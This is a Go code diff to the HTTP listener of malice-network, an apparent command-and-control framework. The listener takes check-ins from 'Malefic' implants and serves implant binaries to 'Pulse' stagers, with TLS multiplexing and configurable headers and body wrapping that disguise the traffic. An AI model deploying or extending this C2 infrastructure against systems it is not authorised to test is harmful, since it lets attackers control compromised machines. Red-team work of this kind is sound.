@@ -3,38 +3,32 @@ package listener
 import (
 	"bytes"
 	"context"
-	"encoding/json"
 	"errors"
 	"fmt"
-	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
-	"github.com/chainreactors/malice-network/server/internal/parser/pulse"
+	"github.com/chainreactors/IoM-go/consts"
+	"github.com/chainreactors/IoM-go/proto/client/clientpb"
+	implantpb "github.com/chainreactors/IoM-go/proto/implant/implantpb"
+	"github.com/chainreactors/IoM-go/proto/services/listenerrpc"
+	types "github.com/chainreactors/IoM-go/types"
+	"github.com/chainreactors/malice-network/helper/implanttypes"
 	"io"
 	"net"
 	"net/http"
 	"strconv"
 
 	"github.com/chainreactors/logs"
-	"github.com/chainreactors/malice-network/helper/consts"
-	"github.com/chainreactors/malice-network/helper/encoders"
-	"github.com/chainreactors/malice-network/helper/encoders/hash"
-	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
-	"github.com/chainreactors/malice-network/helper/proto/services/listenerrpc"
-	"github.com/chainreactors/malice-network/helper/types"
-	"github.com/chainreactors/malice-network/helper/utils/peek"
 	"github.com/chainreactors/malice-network/server/internal/certutils"
 	"github.com/chainreactors/malice-network/server/internal/core"
-	"github.com/chainreactors/malice-network/server/internal/parser"
+	"github.com/chainreactors/malice-network/server/internal/parser/pulse"
+	cryptostream "github.com/chainreactors/malice-network/server/internal/stream"
 )
 
 func NewHttpPipeline(rpc listenerrpc.ListenerRPCClient, pipeline *clientpb.Pipeline) (*HTTPPipeline, error) {
-	http := pipeline.Body.(*clientpb.Pipeline_Http).Http
+	http := pipeline.GetHttp()
 
-	// 解析额外参数
-	var params types.PipelineParams
-	if http.Params != "" {
-		if err := json.Unmarshal([]byte(http.Params), &params); err != nil {
-			return nil, fmt.Errorf("failed to unmarshal pipeline params: %v", err)
-		}
+	params, err := implanttypes.UnmarshalPipelineParams(http.Params)
+	if err != nil {
+		return nil, fmt.Errorf("failed to unmarshal pipeline params: %v", err)
 	}
 
 	pp := &HTTPPipeline{
@@ -42,33 +36,26 @@ func NewHttpPipeline(rpc listenerrpc.ListenerRPCClient, pipeline *clientpb.Pipel
 		Name:           pipeline.Name,
 		Port:           uint16(http.Port),
 		Host:           http.Host,
-		Target:         pipeline.Target,
-		BeaconPipeline: pipeline.BeaconPipeline,
-		PipelineConfig: core.FromProtobuf(pipeline),
+		PipelineConfig: core.FromPipeline(pipeline),
 		Headers:        params.Headers,
+		CertName:       pipeline.CertName,
 		ErrorPage:      []byte(params.ErrorPage),
 		BodyPrefix:     []byte(params.BodyPrefix),
 		BodySuffix:     []byte(params.BodySuffix),
-	}
-	var err error
-	pp.parser, err = parser.NewParser(pp.Parser)
-	if err != nil {
-		return nil, err
 	}
 
 	return pp, nil
 }
 
 type HTTPPipeline struct {
-	srv            *http.Server
-	rpc            listenerrpc.ListenerRPCClient
-	Name           string
-	Port           uint16
-	Host           string
-	Enable         bool
-	Target         []string
-	BeaconPipeline string
-	parser         *parser.MessageParser
+	srv      net.Listener
+	rpc      listenerrpc.ListenerRPCClient
+	Name     string
+	Port     uint16
+	Host     string
+	Enable   bool
+	Target   []string
+	CertName string
 	*core.PipelineConfig
 	Headers    map[string][]string
 	ErrorPage  []byte
@@ -77,24 +64,32 @@ type HTTPPipeline struct {
 }
 
 func (pipeline *HTTPPipeline) ToProtobuf() *clientpb.Pipeline {
+	params := (&implanttypes.PipelineParams{
+		Headers:    pipeline.Headers,
+		ErrorPage:  string(pipeline.ErrorPage),
+		BodyPrefix: string(pipeline.BodyPrefix),
+		BodySuffix: string(pipeline.BodySuffix),
+	}).String()
+
 	p := &clientpb.Pipeline{
-		Name:           pipeline.Name,
-		Enable:         pipeline.Enable,
-		Type:           consts.HTTPPipeline,
-		ListenerId:     pipeline.ListenerID,
-		Parser:         pipeline.Parser,
-		Target:         pipeline.Target,
-		BeaconPipeline: pipeline.BeaconPipeline,
+		Name:       pipeline.Name,
+		Enable:     pipeline.Enable,
+		Type:       consts.HTTPPipeline,
+		ListenerId: pipeline.ListenerID,
+		Parser:     pipeline.Parser,
+		CertName:   pipeline.CertName,
 		Body: &clientpb.Pipeline_Http{
 			Http: &clientpb.HTTPPipeline{
 				Name:       pipeline.Name,
 				ListenerId: pipeline.ListenerID,
 				Port:       uint32(pipeline.Port),
 				Host:       pipeline.Host,
+				Params:     params,
 			},
 		},
-		Tls:        pipeline.Tls.ToProtobuf(),
+		Tls:        pipeline.TLSConfig.ToProtobuf(),
 		Encryption: pipeline.Encryption.ToProtobuf(),
+		Secure:     pipeline.SecureConfig.ToProtobuf(),
 	}
 	return p
 }
@@ -106,7 +101,12 @@ func (pipeline *HTTPPipeline) ID() string {
 func (pipeline *HTTPPipeline) Close() error {
 	pipeline.Enable = false
 	if pipeline.srv != nil {
-		return pipeline.srv.Close()
+		ln := pipeline.srv
+		pipeline.srv = nil
+		if err := ln.Close(); err != nil && !errors.Is(err, net.ErrClosed) {
+			return err
+		}
+		return nil
 	}
 	return nil
 }
@@ -121,64 +121,87 @@ func (pipeline *HTTPPipeline) Start() error {
 	}
 	forward.ListenerId = pipeline.ListenerID
 	core.Forwarders.Add(forward)
-	go func() {
-		defer logs.Log.Errorf("forwarder stream exit!!!")
+	core.GoGuarded("http-forward-recv:"+pipeline.Name, func() error {
 		for {
 			msg, err := forward.Stream.Recv()
 			if err != nil {
-				return
+				if !pipeline.Enable {
+					return nil
+				}
+				return fmt.Errorf("http pipeline %s forward recv: %w", pipeline.Name, err)
 			}
-			connect := core.Connections.Get(msg.Session.SessionId)
-			if connect == nil {
-				logs.Log.Errorf("connection %s not found", msg.Session.SessionId)
+			if err := core.Connections.Push(msg.Session.SessionId, msg); err != nil {
+				// Beacon sessions are only connected during heartbeat windows,
+				// so push failures between beacons are expected. Keep at Debug
+				// to avoid log spam; the task is retried on next beacon check-in.
+				logs.Log.Debugf("http pipeline %s push to %s: %s", pipeline.Name, msg.Session.SessionId, err)
 				continue
 			}
-			connect.C <- msg
 		}
-	}()
+	}, pipeline.runtimeErrorHandler("forward recv loop"))
+
+	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", pipeline.Host, pipeline.Port))
+	if err != nil {
+		return err
+	}
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", pipeline.handler)
 
-	pipeline.srv = &http.Server{
-		Addr:    fmt.Sprintf("%s:%d", pipeline.Host, pipeline.Port),
-		Handler: mux,
-	}
-
-	if pipeline.Tls != nil && pipeline.Tls.Enable {
-		tlsConfig, err := certutils.GetTlsConfig(pipeline.Tls.ToProtobuf())
+	if pipeline.TLSConfig != nil && pipeline.TLSConfig.Enable && pipeline.TLSConfig.Cert != nil {
+		err := pipeline.startWithCmux(ln, mux)
 		if err != nil {
 			return err
 		}
-		pipeline.srv.TLSConfig = tlsConfig
-		go func() {
-			if err := pipeline.srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
-				logs.Log.Errorf("HTTPS server error: %v", err)
-			}
-		}()
 	} else {
-		go func() {
-			if err := pipeline.srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
-				logs.Log.Errorf("HTTP server error: %v", err)
+		// 非 TLS 模式，使用原有逻辑
+		pipeline.srv = ln
+		server := NewHTTPServer(mux)
+		core.GoGuarded("http-serve:"+pipeline.Name, func() error {
+			if err := serveHTTP(server, ln); err != nil && err != http.ErrServerClosed && !errors.Is(err, net.ErrClosed) {
+				return fmt.Errorf("http pipeline %s serve: %w", pipeline.Name, err)
 			}
-		}()
+			return nil
+		}, pipeline.runtimeErrorHandler("serve loop"))
 	}
 
-	logs.Log.Infof("[pipeline] starting HTTP pipeline on %s:%d, parser: %s, cryptor: %s, tls: %t",
-		pipeline.Host, pipeline.Port, pipeline.Parser, pipeline.Encryption.Type, pipeline.Tls.Enable)
+	logs.Log.Infof("pipeline.http - start host=%s port=%d parser=%s tls=%t",
+		pipeline.Host, pipeline.Port, pipeline.Parser, pipeline.TLSConfig.Enable)
 	pipeline.Enable = true
 	return nil
 }
 
-func (pipeline *HTTPPipeline) handlePulse(resp http.ResponseWriter, req *http.Request, conn *peek.Conn) {
-	magic, artifactId, err := pipeline.parser.ReadHeader(conn)
+// startWithCmux 使用 cmux 实现 HTTP TLS 和非 TLS 的端口复用
+func (pipeline *HTTPPipeline) startWithCmux(ln net.Listener, mux *http.ServeMux) error {
+	// 获取 TLS 配置
+	tlsConfig, err := certutils.GetTlsConfig(pipeline.TLSConfig.Cert)
 	if err != nil {
-		logs.Log.Errorf(err.Error())
+		return err
+	}
+
+	_, err = StartCmuxHTTPListener(ln, tlsConfig, mux, pipeline.runtimeErrorHandler("cmux"))
+	if err != nil {
+		return err
+	}
+
+	// 保存服务器引用用于关闭
+	pipeline.srv = ln
+
+	return nil
+}
+
+func (pipeline *HTTPPipeline) handlePulse(resp http.ResponseWriter, req *http.Request, conn *cryptostream.Conn) {
+	p := conn.Parser
+	magic, artifactId, err := p.ReadHeader(conn)
+	if err != nil {
+		logs.Log.Errorf("%v", err)
 		return
 	}
 
 	builder, err := pipeline.rpc.GetArtifact(context.Background(), &clientpb.Artifact{
-		Id: uint32(artifactId),
+		Id:       artifactId,
+		Pipeline: pipeline.Name,
+		Format:   consts.FormatRaw,
 	})
 	if err != nil {
 		logs.Log.Errorf("not found artifact %d ,%s ", artifactId, err.Error())
@@ -189,21 +212,22 @@ func (pipeline *HTTPPipeline) handlePulse(resp http.ResponseWriter, req *http.Re
 	resp.Header().Set("Content-Length", fmt.Sprintf("%d", len(builder.Bin)+pulse.HeaderLength+1))
 	logs.Log.Infof("send artifact %d %s", builder.Id, builder.Name)
 
-	err = pipeline.parser.WritePacket(conn, types.BuildOneSpites(&implantpb.Spite{
+	err = p.WritePacket(conn, types.BuildOneSpites(&implantpb.Spite{
 		Name: consts.ModuleInit,
 		Body: &implantpb.Spite_Init{
 			Init: &implantpb.Init{Data: builder.Bin},
 		},
 	}), magic)
 	if err != nil {
-		logs.Log.Errorf(err.Error())
+		logs.Log.Errorf("%s", err.Error())
 		return
 	}
 }
 
-func (pipeline *HTTPPipeline) handleMalefic(w http.ResponseWriter, r *http.Request, conn *peek.Conn) {
-	ctx, _ := context.WithCancel(r.Context())
-	connect, err := pipeline.getConnection(conn)
+func (pipeline *HTTPPipeline) handleMalefic(w http.ResponseWriter, r *http.Request, conn *cryptostream.Conn) {
+	ctx, cancel := context.WithCancel(r.Context())
+	defer cancel()
+	connect, err := core.GetOrReuseConnection(conn, pipeline.ID(), pipeline.SecureConfig)
 	if err != nil {
 		pipeline.writeError(w, http.StatusBadRequest, "Invalid request")
 		return
@@ -212,55 +236,46 @@ func (pipeline *HTTPPipeline) handleMalefic(w http.ResponseWriter, r *http.Reque
 	err = connect.HandlerSimplex(ctx, conn)
 	if err != nil {
 		if !errors.Is(err, io.EOF) {
-			logs.Log.Debugf("handler error: %s", err.Error())
+			logs.Log.Warnf("http pipeline %s handler error from %s: %s", pipeline.Name, r.RemoteAddr, err.Error())
 		}
 		return
 	}
 }
 
 func (pipeline *HTTPPipeline) handler(w http.ResponseWriter, r *http.Request) {
-	// 设置自定义响应头
-	for key, values := range pipeline.Headers {
-		for _, value := range values {
-			w.Header().Add(key, value)
+	err := core.RunGuarded("http-request:"+pipeline.Name, func() error {
+		// 设置自定义响应头
+		for key, values := range pipeline.Headers {
+			for _, value := range values {
+				w.Header().Add(key, value)
+			}
 		}
-	}
-	rw := &httpReadWriter{
-		body:       r.Body,
-		writer:     w,
-		remoteAddr: parseRemoteAddr(r.RemoteAddr),
-		bodyPrefix: pipeline.BodyPrefix,
-		bodySuffix: pipeline.BodySuffix,
-	}
+		rw := &httpReadWriter{
+			body:       r.Body,
+			writer:     w,
+			remoteAddr: parseRemoteAddr(r.RemoteAddr),
+			bodyPrefix: pipeline.BodyPrefix,
+			bodySuffix: pipeline.BodySuffix,
+		}
 
-	conn, err := pipeline.WrapConn(rw)
+		conn, err := pipeline.WrapConn(rw)
+		if err != nil {
+			return fmt.Errorf("http pipeline %s wrap conn: %w", pipeline.Name, err)
+		}
+
+		logs.Log.Debugf("pipeline.http - accept pipeline=%s remote=%s", pipeline.Name, r.RemoteAddr)
+		switch conn.Parser.Implant {
+		case consts.ImplantMalefic:
+			pipeline.handleMalefic(w, r, conn)
+		case consts.ImplantPulse:
+			pipeline.handlePulse(w, r, conn)
+		default:
+			return fmt.Errorf("http pipeline %s unsupported implant: %s", pipeline.Name, conn.Parser.Implant)
+		}
+		return nil
+	}, core.LogGuardedError("http-request:"+pipeline.Name))
 	if err != nil {
 		pipeline.writeError(w, http.StatusInternalServerError, "Internal server error")
-		return
-	}
-	switch pipeline.Parser {
-	case consts.ImplantMalefic:
-		pipeline.handleMalefic(w, r, conn)
-	case consts.ImplantPulse:
-		pipeline.handlePulse(w, r, conn)
-	default:
-		pipeline.writeError(w, http.StatusInternalServerError, "Internal server error")
-	}
-}
-
-func (pipeline *HTTPPipeline) getConnection(conn *peek.Conn) (*core.Connection, error) {
-	p := pipeline.parser
-	sid, _, err := p.PeekHeader(conn)
-	if err != nil {
-		return nil, err
-	}
-
-	if newC := core.Connections.Get(hash.Md5Hash(encoders.Uint32ToBytes(sid))); newC != nil {
-		return newC, nil
-	} else {
-		newC := core.NewConnection(p, sid, pipeline.ID())
-		core.Connections.Add(newC)
-		return newC, nil
 	}
 }
 
@@ -281,17 +296,20 @@ func (h *httpReadWriter) Read(p []byte) (n int, err error) {
 func (h *httpReadWriter) Write(p []byte) (n int, err error) {
 	var buf bytes.Buffer
 	if len(h.bodyPrefix) > 0 {
-		buf.Write(h.bodyPrefix)
+		if _, err := buf.Write(h.bodyPrefix); err != nil {
+			return 0, err
+		}
 	}
 	n, err = buf.Write(p)
 	if err != nil {
 		return n, err
 	}
-
 	if len(h.bodySuffix) > 0 {
-		buf.Write(h.bodySuffix)
+		if _, err := buf.Write(h.bodySuffix); err != nil {
+			return n, err
+		}
 	}
-	//h.writer.Header().Set("Content-Length", strconv.Itoa(buf.Len()))
+	h.writer.Header().Set("Content-Length", strconv.Itoa(buf.Len()))
 	if _, err := h.writer.Write(buf.Bytes()); err != nil {
 		return n, err
 	}
@@ -299,7 +317,7 @@ func (h *httpReadWriter) Write(p []byte) (n int, err error) {
 }
 
 func (h *httpReadWriter) Close() error {
-	return h.Close()
+	return nil
 }
 
 func (h *httpReadWriter) RemoteAddr() net.Addr {
@@ -330,4 +348,27 @@ func (pipeline *HTTPPipeline) writeError(w http.ResponseWriter, statusCode int, 
 	} else {
 		http.Error(w, defaultMessage, statusCode)
 	}
+}
+
+func (pipeline *HTTPPipeline) runtimeErrorHandler(scope string) core.GoErrorHandler {
+	label := fmt.Sprintf("http pipeline %s %s", pipeline.Name, scope)
+	return core.CombineErrorHandlers(
+		core.LogGuardedError(label),
+		func(err error) {
+			pipeline.Enable = false
+			if pipeline.srv != nil {
+				_ = pipeline.srv.Close()
+			}
+			if core.EventBroker != nil {
+				core.EventBroker.Publish(core.Event{
+					EventType: consts.EventListener,
+					Op:        consts.CtrlPipelineStop,
+					Listener:  &clientpb.Listener{Id: pipeline.ListenerID},
+					Message:   label,
+					Err:       core.ErrorText(err),
+					Important: true,
+				})
+			}
+		},
+	)
 }
